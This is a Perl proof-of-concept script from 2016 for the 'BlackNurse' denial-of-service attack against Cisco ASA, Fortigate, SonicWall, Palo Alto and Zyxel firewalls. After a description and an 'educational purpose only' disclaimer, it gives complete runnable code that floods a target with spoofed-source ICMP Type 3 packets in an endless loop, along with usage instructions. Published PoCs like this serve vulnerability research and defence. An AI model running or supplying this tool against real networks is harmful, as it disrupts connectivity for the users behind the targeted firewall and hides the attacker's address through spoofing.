#!/usr/bin/perl
#
# Cisco ASA 5515/5525/5550/5515-X | Fotinet | 
# Fortigate | SonicWall | PaloAlto | Zyxel NWA3560-N | 
# Zyxel Zywall USG50 Spoofed "BlackNurse" DoS PoC
#
#  Copyright 2016 (c) Todor Donev
#  Varna, Bulgaria
#  todor.donev@gmail.com
#  https://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  http://pastebin.com/u/hackerscommunity 
#
# 
#  Description:
#  Blacknurse is a low bandwidth ICMP attack that is capable of doing denial 
#  of service to well known firewalls. Most ICMP attacks that we see are based 
#  on ICMP Type 8 Code 0 also called a ping flood attack. BlackNurse is based 
#  on ICMP with Type 3 Code 3 packets. We know that when a user has allowed ICMP 
#  Type 3 Code 3 to outside interfaces, the BlackNurse attack becomes highly 
#  effective even at low bandwidth. Low bandwidth is in this case around 15-18 
#  Mbit/s. This is to achieve the volume of packets needed which is around 40 to 
#  50K packets per second. It does not matter if you have a 1 Gbit/s Internet 
#  connection. The impact we see on different firewalls is typically high CPU 
#  loads. When an attack is ongoing, users from the LAN side will no longer be 
#  able to send/receive traffic to/from the Internet. All firewalls we have seen 
#  recover when the attack stops.
#
#  Disclaimer:
#  This or previous program is for Educational purpose ONLY. Do not 
#  use it without permission. The usual disclaimer applies, especially 
#  the fact that Todor Donev is not liable for any damages caused by 
#  direct or indirect use of the information or functionality provided 
#  by these programs. The author or any Internet provider bears NO 
#  responsibility for content or misuse of these programs or any 
#  derivatives thereof. By using these programs you accept the fact
#  that any damage (dataloss, system crash, system compromise, etc.) 
#  caused by the use of these programs is not Todor Donev's 
#  responsibility.
#
#  Use at your own risk and educational
#  purpose ONLY!
#
#  Thanks to Maya (Maiya|Mia) Hristova and all my friends 
#  that support me.
#
#
  
use Net::RawIP;

print "[ Cisco ASA 5515/5525/5550/5515-X | Fotinet | Fortigate | SonicWall | PaloAlto | Zyxel NWA3560-N | Zyxel Zywall USG50 Spoofed \"BlackNurse\" DoS PoC\n";
print "[ ======\n";
print "[ Usg: $0 <spoofed address> <target>\n";
print "[ Example: perl $0 133.71.33.7 192.168.1.1\n";
print "[ ======\n";
print "[ <todor.donev\@gmail.com> Todor Donev\n";
print "[ Facebook: https://www.facebook.com/ethicalhackerorg\n";
print "[ Website: https://www.ethical-hacker.org/\n";

my $spoof          = $ARGV[0];
my $target         = $ARGV[1];

my $sock =  new Net::RawIP({ icmp => {} }) or die;

print "[ Sending crafted packets..\n";
while () {
                $sock->set({  ip =>  { saddr  => $spoof, daddr => $target},
                              icmp =>  { type => 3, code => 3} });
                $sock->send;
                $sock->set({  icmp => { type=>3, code => 0}});
                $sock->send;
                $sock->set({  icmp => { type=>3, code => 1}});
       	       	$sock->send;
                $sock->set({  icmp => { type=>3, code => 2}});
       	       	$sock->send;
}
